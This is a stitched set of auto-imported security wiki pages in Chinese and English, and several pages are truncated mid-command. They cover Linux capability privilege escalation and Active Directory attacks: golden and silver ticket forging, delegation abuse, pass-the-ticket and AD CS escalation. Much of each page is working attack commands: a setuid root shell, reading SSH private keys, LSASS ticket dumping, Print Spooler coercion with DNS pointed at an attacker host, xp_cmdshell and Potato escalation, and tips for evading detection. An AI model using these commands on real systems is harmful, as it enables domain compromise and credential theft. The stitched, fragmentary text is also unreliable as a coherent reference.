content: 来源路径： 02-知识点/域与Windows/🛠️ Capabilities 技术笔记.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # 🛠️ Capabilities 技术笔记 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 🛠️ Capabilities 技术笔记 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 🛠️ Capabilities 技术笔记 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：🛠️ Capabilities、Theory、Capability inheritance, capability drop、Practice；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 4 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 🛠️ Capabilities Theory Capability inheritance, capability drop Practice # 核心要点 Basic processes : Have no capabilities (file access is controlled by traditional file privileges). On fork() call, the child thread will have the same capabilities as the parent thread. If a thread calls execve() on a binary file, its capabilities will be modified following the pattern described in the man pages (see man capabilities). Exploiting capabilities : If the python binary has the cap setuid then it becomes trivial to get a root shell : Arbitrary 文件读取 : zip with cap dac read search # 命令 / 载荷 / 操作片段 # 1. Practice 12345678910111213# set capability to change uid to file (+ep to add to effective & permitted)setcap cap_setuid+ep /path/to/file# delete capabilitessetcap -r /path/to/file# get file(s) capabilitiesgetcap -r dir 2>/dev/nullgetcap file# listing & decoding a running process' capabilitiesgrep Cap /proc/$pid/statuscapsh --decode=000001ffffffffff # 2. Practice 1./python -c "import os; os.setuid(0); os.system('/bin/sh')" # 3. Practice 1234# cap_dac_read_search allows zip/tar to read any file (get ssh private key here)zip /tmp/private_k.zip ~/.ssh/id_rsaunzip /tmp/private_k.zip -d /tmp# id_rsa is now readable in the unzipped folder # 4. Practice 12# to keep capabilities when copying a binarycp --preserve=all /origin/path /dest/path # 工具与参考入口 https://blog.ploetzli.ch/2014/understanding-linux-capabilities/ https://materials.rangeforce.com/tutorial/2020/02/19/Linux-PrivEsc-Capabilities/ # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 Pwn 基础链路 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Filter 绕过: one can 绕过 filters using UTF-8 encoding # 命令 / 载荷 / 操作片段 # 1. 侦察 123# Response (due to an application error)HTTP/1.1 301 Moved PermanentlyLocation: /index?error=Page+Not+Found # 2. Active Directory 域 证书服务 add multiple objects to AD, including securable ones which principals can have permissions over. This includes Certificate templates, Certificate Authorities, CA server, etc. In the same research papers, domain escalation techniques abusing misconfigurated access controls were identified dubbed ESC4, ESC5 and ESC7). If an attacker obtains sufficient permissions in a domain, he could modify security descriptors of AD CS components, in order to make them vulnerable to the attacks mentioned in Movement > AD-CS > Access controls. In their research papers, Will Schroeder and Lee Christensen found multiple vectors of domain escalation based on access control misconfigurations (dubbed ESC4, ESC5 and ESC7). Active Directory 域 证书服务 add multiple objects to AD, including securable ones which principals can have permissions over. This includes: The CA server’s AD computer object (i.e., compromise through RBCD abuse, Shadow 凭据，UnPAC-the - 哈希，...). PowerSploit's Add-DomainObjectAcl function (in PowerView) can be used to add Certificate-Enrollment rights to a "controlled AD object" over a specific template. In order to achieve this, the attacker needs to have enough rights (i.e. WriteDacl) over the certificate template. content: 来源路径： 02-知识点/域与Windows/黄金票据.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # 黄金票据 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 黄金票据 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 黄金票据 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Modern ticket crafting notes、Bypassing common detections、Mitigation；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 5 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Modern ticket crafting notes Bypassing common detections Mitigation # 核心要点 When possible, query LDAP and SYSVOL first and then forge the ticket using the real domain policy and user PAC values instead of inventing them manually: /ldap asks the DC for the user, group, NetBIOS and policy data used to build a more realistic PAC. /printcmd prints an offline command line containing the retrieved PAC fields, which is useful if you later want to forge the same ticket without touching LDAP again. -extra-sid is useful when the PAC needs additional SIDs (for example, in child-to-parent escalation scenarios, which are covered in SID-History Injection). Once you have the 黄金票据 injected, you can access the shared files (C$), and execute services and WMI, so you could use psexec or wmiexec to obtain a shell (looks like you cannot get a shell via winrm). The most frequent ways to detect a 黄金票据 are by inspecting Kerberos traffic on the wire. By default, Mimikatz signs the TGT for 10 years, which will stand out as anomalous in subsequent TGS requests made with it. Get-WinEvent -FilterHashtable @{Logname='Security';ID=4672} -MaxEvents 1 | Format-List –Property # 命令 / 载荷 / 操作片段 # 1. 黄金票据 123python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park stegosaurusexport KRB5CCNAME=/root/impacket-examples/stegosaurus.ccachepython psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass # 2. 黄金票据 123456789101112131415# Rubeus## The /ldap command will get the details from the LDAP (so you don't need to put the SID)## The /printcmd option will print the complete command if later you want to generate a token offline.\Rubeus.exe golden /rc4:<krbtgt_hash> /domain:<child_domain> /sid:<child_domain_sid> /sids:<parent_domain_sid>-519 /user:Administrator /ptt /ldap /nowrap /printcmd# Example.\Rubeus.exe golden /rc4:25b2076cda3bfd6209161a6c78a69c1c /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /user:stegosaurus /ptt /ldap /nowrap#mimikatzkerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt.\Rubeus.exe ptt /ticket:ticket.kirbiklist #List tickets in memory# Example using aes keykerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi # 3. Modern ticket crafting notes 1Rubeus.exe golden /aes256:<krbtgt_aes256> /user:<username> /ldap /printcmd /nowrap # 4. Modern ticket crafting notes 123python3 ticketer.py -aesKey <krbtgt_aes256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \ -user-id 500 -groups 512,513,518,519 -duration 10 \ -extra-pac administrator # 5. Bypassing common detections 1Get-DomainPolicy | select -expand KerberosPolicy # 工具与参考入口 https://www.tarlogic.com/blog/how-to-attack-kerberos/ https://github.com/GhostPack/Rubeus # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 Kerberos 票据攻击 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

title: 非约束委派
content: 来源路径： 02-知识点/域与Windows/非约束委派.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # 非约束委派 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 非约束委派 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 非约束委派 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Force 认证、Abusing a user/service account with 非约束委派、Abusing 非约束委派 with an attacker-created computer、Mitigation；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 10 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Force 认证 Abusing a user/service account with 非约束委派 Abusing 非约束委派 with an attacker-created computer Mitigation # 核心要点 So if a domain admin logins inside a Computer with "非约束委派" feature activated, and you have local admin privileges inside that machine, you will be able to dump the ticket and impersonate the Domain Admin anywhere (domain privesc). You can find Computer objects with this attribute checking if the userAccountControl.aspx>) attribute contains ADS UF TRUSTED FOR DELEGATION.aspx>). You can do this with an LDAP filter of ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, which is what powerview does: Load the ticket of Administrator (or victim user) in memory with Mimikatz or Rubeus for a 票据传递 **.**\ If an attacker is able to compromise a computer allowed for "非约束委派", he could trick a Print server to automatically login against it saving a TGT in the memory of the server.\ Then, the attacker could perform a 票据传递 attack to impersonate the user Print server computer account. If the TGT if from a domain controller, you could perform a DCSync attack and obtain all the hashes from the DC.\ More info about this attack in ired.team. This is especially useful when the unconstrained principal is a service account and you only have its 凭据，not code execution on a joined host. If the target user already has a stale SPN, recreating the corresponding DNS record may be less noisy than writing a new SPN into AD. MachineAccountQuota > 0 enables unprivileged computer creation; otherwise you need explicit rights. Setting TRUSTED FOR DELEGATION on a computer requires SeEnableDelegationPrivilege (or domain admin). If the victim account is marked as "Account is sensitive and cannot be delegated" or is a member of Protected Users, the forwarded TGT will not be included in the service ticket, so this chain won't yield a reusable TGT. If Credential Guard is enabled on the authenticating client/server, Windows blocks Kerberos 非约束委派，which can make otherwise valid coercion paths fail from an operator perspective. Restrict SeEnableDelegationPrivilege to a minimal set, set MachineAccountQuota=0 where feasible, and disable Print Spooler on DCs. Enforce LDAP signing and channel binding. # 命令 / 载荷 / 操作片段 # 1. 非约束委派 12345678910111213141516171819# List unconstrained computers## Powerview## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)Get-DomainComputer –Unconstrained –Properties nameGet-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'## ADSearchADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem# Export tickets with Mimikatz## Access LSASS memoryprivilege::debugsekurlsa::tickets /export #Recommended waykerberos::list /export #Another way# Monitor logins and export new tickets## Doens't access LSASS memory directly, but uses Windows APIsRubeus.exe dumpRubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs # 2. Force 认证 1.\SpoolSample.exe <printmachine> <unconstrinedmachine> # 3. Abusing a user/service account with 非约束委派 1234567891011121314151617181920212223# 1) Find unconstrained-delegation users and their SPNsGet-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'# 2) If needed, add a listener SPN to the compromised unconstrained userpython3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \ -s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP># 3) Make the hostname resolve to your attacker boxpython3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \ -r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP># 4) Start krbrelayx with the unconstrained user's Kerberos material# For user accounts, the salt is usually UPPERCASE_REALM + samAccountNamepython3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc

content: 来源路径： 02-知识点/域与Windows/证书服务 (AD-CS).md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # 证书服务 (AD-CS) [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 证书服务 (AD-CS) 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 证书服务 (AD-CS) 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Theory、Practice、Escalation techniques、Terminology、侦察；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 6 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Theory Practice Escalation techniques Terminology 侦察 Cert Publishers pKIEnrollmentService objects Attack paths Abuse # 核心要点 See AD > Movement > 证书服务 (AD-CS) to know more about it. In their research papers, Will Schroeder and Lee Christensen shared their research on AD CS and identified multiple theft, escalation and 持久化 vectors. Credential theft (dubbed THEFT1 to THEFT5) Account 持久化 (dubbed PERSIST1 to PERSIST3) Domain escalation (dubbed ESC1 to ESC14) based on misconfigured certificate templates related to access control vulnerabilities based on an NTLM 中继 漏洞 related to the unsigned endpoints of AD CS Domain 持久化 (dubbed DPERSIST1 to DPERSIST3) by forging certificates with a stolen CA certificates by trusting rogue CA certificates by maliciously creating vulnerable access controls based on an NTLM 中继 漏洞 related to the web and RPC endpoints of AD CS ESC3 "certificate-agent-eku" ESC4 "certificate-templates" ESC7 "certificate-authority" # 命令 / 载荷 / 操作片段 # 1. pKIEnrollmentService objects 1netexec ldap 'domaincontroller' -d 'domain' -u 'user' -p 'password' -M adcs # 2. pKIEnrollmentService objects 1windapsearch -m custom --filter '(objectCategory=pKIEnrollmentService)' --base 'CN=Configuration,DC=domain,DC=local' --attrs dn,dnshostname --dc 'domaincontroller' -d 'domain.local' -u 'user' -p 'password' # 3. pKIEnrollmentService objects 1ntlmrelayx -t "ldap://domaincontroller" --dump-adcs # 4. Attack paths 12345# enumerate and save text, json and bloodhound (original) outputscertipy find -u 'user@domain.local' -p 'password' -dc-ip 'DC_IP' -old-bloodhound# quickly spot vulnerable elementscertipy find -u 'user@domain.local' -p 'password' -dc-ip 'DC_IP' -vulnerable -stdout # 5. Attack paths 1Certify.exe cas # 6. Attack paths 12345678910111213# Import the PowerShell script and show its manualImport-Module .\Invoke-PassTheCert.ps1.\Invoke-PassTheCert.ps1 -?# Authenticate to LDAP/S$LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server 'LDAP_IP' -Port 636 -Certificate cert.pfx# List all the available actionsInvoke-PassTheCert -a -NoBanner# Enumerates all Certificate Authorities in the 'ADLAB.LOCAL' domainInvoke-PassTheCert -Action 'LDAPEnum' -LdapConnection $LdapConnection -Enum 'CAs' -SearchBase 'DC=ADLAB,DC=LOCAL'# Enumerates all Certificate Templates in the 'ADLAB.LOCAL' domainInvoke-PassTheCert -Action 'LDAPEnum' -LdapConnection $LdapConnection -Enum 'CertificateTemplates' -SearchBase 'DC=ADLAB,DC=LOCAL' # 工具与参考入口 specterops.io Will Schroeder Lee Christensen netexec AD CS 证书服务 windapsearch Impacket ntlmrelayx SAERXCIT PR#1214 Certipy Certify BloodHound 图分析 forked author Invoke-PassTheCert PassTheCert README certreq https://http418infosec.com/ad-cs-what-can-be-misconfigured # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 AD CS 证书攻击 侦察枚举流水线 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

Also, LDAP service access on DC, is what is needed to 利用 a DCSync. If you prefer forging the user ST first (e.g., offline 哈希 only), pair ticketer.py with getST.py for S4U2Proxy. See the open Impacket issue #1713 for current quirks (KRB AP ERR MODIFIED when the forged ST doesn't match the SPN key). If you already hold GenericAll/WriteDACL over a computer or service account, you can push the required attributes remotely without RSAT using bloodyAD (2024+): This lets you build a 约束委派 path for privesc without DA privileges as soon as you can write those attributes. There are other ways to obtain a TGT ticket or the RC4 or AES256 without being SYSTEM in the computer like the Printer Bug and unconstrain delegation, NTLM relaying and Active Directory 域 Certificate Service abuse More information in ired.team. and https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61 # 命令 / 载荷 / 操作片段 # 1. 约束委派 123456# PowerviewGet-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegatetoGet-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto#ADSearchADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json # 2. 约束委派 12# Generate TGT + TGS impersonating a user knowing the hashRubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt # 3. Impacket / Linux tooling (altservice & full S4U) 1234567891011# Get TGT for delegating service (hash/aes)getTGT.py contoso.local/websvc$ -hashes :8c6264140d5ae7d03f7f2a53088a291d# S4U2self + S4U2proxy in one go, impersonating Administrator to CIFS then swapping to HOSTgetST.py -spn CIFS/dc.contoso.local -altservice HOST/dc.contoso.local \ -impersonate Administrator contoso.local/websvc$ \ -hashes :8c6264140d5ae7d03f7f2a53088a291d -k -dc-ip 10.10.10.5# Inject resulting ccacheexport KRB5CCNAME=Administrator.ccachesmbclient -k //dc.contoso.local/C$ -c 'dir' # 4. Automating delegation setup from low-priv creds 123# Set TRUSTED_TO_AUTH_FOR_DELEGATION and point delegation to CIFS/DCKRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local add uac WEBSRV$ -f TRUSTED_TO_AUTH_FOR_DELEGATIONKRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local set object WEBSRV$ msDS-AllowedToDelegateTo -v 'cifs/dc.corp.local' # 5. Automating delegation setup from low-priv creds 12345678910111213141516# The first step is to get a TGT of the service that can impersonate others## If you are SYSTEM in the server, you might take it from memory.\Rubeus.exe triage.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one## Get AES/RC4 with mimikatzmimikatz sekurlsa::ekeys## Request with aestgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap# Request with RC4tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi # 6. Automating delegation setup from low-priv creds 1234567891011121314# Obtain a TGS of the Administrator user to self.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator# Obtain service TGS impersonating Administrator (CIFS).\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS#Impersonate Administrator on different service (HOST).\Rubeus.exe s4u

content: 来源路径： 02-知识点/域与Windows/票据传递.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # 票据传递 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 票据传递 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 票据传递 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：票据传递 (PTT)、Swaping Linux and Windows tickets between platforms、票据传递 Attack；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 3 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 票据传递 (PTT) Swaping Linux and Windows tickets between platforms 票据传递 Attack # 核心要点 In the 票据传递 (PTT) attack method, attackers steal a user's 认证 ticket instead of their 密码 or 哈希 values. This stolen ticket is then used to impersonate the user, gaining unauthorized access to resources and services within a network. Harvesting tickets from Windows Harvesting tickets from Linux The ticket converter tool converts ticket formats using just the ticket itself and an output file. # 命令 / 载荷 / 操作片段 # 1. Swaping Linux and Windows tickets between platforms 12345python ticket_converter.py velociraptor.ccache velociraptor.kirbiConverting ccache => kirbipython ticket_converter.py velociraptor.kirbi velociraptor.ccacheConverting kirbi => ccache # 2. 票据传递 Attack 12export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpKpython psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass # 3. 票据传递 Attack 12345#Load the ticket in memory using mimikatz or Rubeusmimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi".\Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbiklist #List tickets in cache to cehck that mimikatz has loaded the ticket.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd # 工具与参考入口 ticket converter Kekeo https://www.tarlogic.com/blog/how-to-attack-kerberos/ # 检查清单 是否确认当前身份、域、主机与票据状态 是否枚举 ACL、SPN、委派、证书模板或共享 是否评估日志与检测痕迹 是否准备回滚 / 清理步骤 # 关联 域与 Windows 总览 知识地图 Kerberos 票据攻击 # 扩展记录 可在这里补充实验环境、样例、检测规则、失败条件与版本差异。

title: 白银票据
content: 来源路径： 02-知识点/域与Windows/白银票据.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # 白银票据 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 白银票据 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 白银票据 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Modern Kerberos changes (AES-only domains)、On Linux、On Windows、Example: MSSQL service (MSSQLSvc) + Potato to SYSTEM、Available Services；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 9 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Modern Kerberos changes (AES-only domains) On Linux On Windows Example: MSSQL service (MSSQLSvc) + Potato to SYSTEM Available Services Silver tickets Event IDs 持久化 Abusing Service tickets CIFS HOST HOST + RPCSS HOST + WSMAN (WINRM) LDAP # 核心要点 Silver Tickets are less detectable than Golden Tickets because they only require the 哈希 of the service account, not the krbtgt account. However, they are limited to the specific service they target. Moreover, just stealing the 密码 of a user. Moreover, if you compromise an account's 密码 with a SPN you can use that 密码 to create a 白银票据 impersonating any user to that service. If the service account msDS-SupportedEncryptionTypes is restricted to AES, you must forge with /aes256 or -aesKey; RC4 (/rc4 or -nthash) will not work even if you hold the NTLM 哈希. OPSEC: default ticket lifetime in 工具 is often 10 years; set realistic durations (e.g., -duration 600 minutes) to avoid 检测 by abnormal lifetimes. For ticket crafting, different 工具 are employed based on the operating system: The CIFS service is highlighted as a common target for accessing the victim's file system, but other services like HOST and RPCSS can also be exploited for tasks and WMI queries. If the resulting context has SeImpersonatePrivilege (often true for service accounts), use a Potato variant to get SYSTEM: /altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm Abnormally long ticket lifetime or unexpected encryption type (RC4 when domain enforces AES) also stand out in 4769/4624 data. # 命令 / 载荷 / 操作片段 # 1. On Linux 123456789101112# Forge with AES instead of RC4 (supports gMSA/machine accounts)python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \ -spn <SERVICE_PRINCIPAL_NAME> <USER># or read key directly from a keytab (useful when only keytab is obtained)python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER># shorten validity for stealthpython ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \ -spn cifs/<HOST_FQDN> -duration 480 <USER>export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccachepython psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass # 2. On Windows 123456789101112131415161718# Using Rubeus to request a service ticket and inject (works when you already have a TGT)# /ldap option is used to get domain data automaticallyrubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \ /domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \ /aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"# RC4 still works only if the DC and service accept RC4mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \ /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"# Inject an already forged kirbimimikatz.exe "kerberos::ptt <TICKET_FILE>".\Rubeus.exe ptt /ticket:<TICKET_FILE># Obtain a shell.\PsExec.exe -accepteula \\<TARGET> cmd # 3. Example: MSSQL service (MSSQLSvc) + Potato to SYSTEM 12345678# Forge a silver ticket for MSSQLSvc (AES example)python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \ -spn MSSQLSvc/<host.fqdn>:1433 administratorexport KRB5CCNAME=$PWD/administrator.ccache# Connect to SQL using Kerberos and run commands via xp_cmdshellimpacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \ -q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'" # 4. Example: MSSQL service (MSSQLSvc) + Potato to SYSTEM 1234# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotatoPrintSpoofer.exe -c "cmd /c whoami"# orGodPotato -cmd "cmd /c whoami" # 5. CIFS 123dir \\vulnerable.computer\C$dir \\vulnerable.computer\ADMIN$copy afile.txt \\vulnerable.computer\C$\Windows\Temp # 6. HOST 123456789#Check you hav

title: 文件包含
content: 来源路径： 02-知识点/域与Windows/文件包含.md 自动导入：安全知识库笔记，已对示例密钥 / Token 做公开发布脱敏。 # 文件包含 [!summary] 提炼定位 面向 域与 Windows 的知识点；已剥离原仓库目录、构建说明、站点资产和安装噪声，只保留概念、流程、命令、工具、方法论与检测线索。 # 适用场景 在 Windows/AD 环境中围绕 文件包含 做枚举、凭据利用、横向或持久化分析。 优先确认身份、票据、权限边界和日志痕迹。 # 中文提炼 核心目标是把 文件包含 放进 AD/Windows 身份链：当前身份、凭据形态、目标对象和可达权限。 优先关注：Theory、Practice；LDAP/SMB/Kerberos/ 证书 / ACL 的结果要能回写到攻击图谱。 每一步都区分枚举、离线验证、远程执行、对象修改和凭据使用，避免把低风险查询误当成利用。 检测视角重点记录登录事件、票据请求、进程链、远程服务、对象属性变更和网络目的地。 本页已沉淀 8 组命令 / 载荷片段；使用时先核对授权范围、目标环境和副作用。 # 关键主题 Theory Practice # 核心要点 Many web applications manage files and use server-side scripts to include them. When input parameters (cookies, GET or POST parameters) used in those scripts are insufficiently validated and sanitized, these web apps can be vulnerable to 文件包含. LFI/RFI (Local / 远程文件包含 RFI) attacks allow attackers to read sensitive files, include local or remote content that could lead to RCE (Remote Code Execution) or to client-side attacks such as XSS (跨站脚本 XSS). Testers need to identify input vectors (parts of the app that accept content from the users) that could be used for file-related operations. For each identified vector, testers need to check if malicious strings and values successfully 利用 any 漏洞. The tool dotdotpwn (Perl) can help in finding and exploiting 目录穿越 vulnerabilities by fuzzing the web app. However, manual testing is usually more efficient. The tool kadimus (C) can help in finding and exploiting 文件包含 vulnerabilities. However, manual testing is usually more efficient. Depending on the environment, file inclusions can sometimes lead to RCE (Remote Code Execution) by including a local file containing code previously injected by the attacker or a remote file containing code that the server can execute. null-byte injection unrestricted file 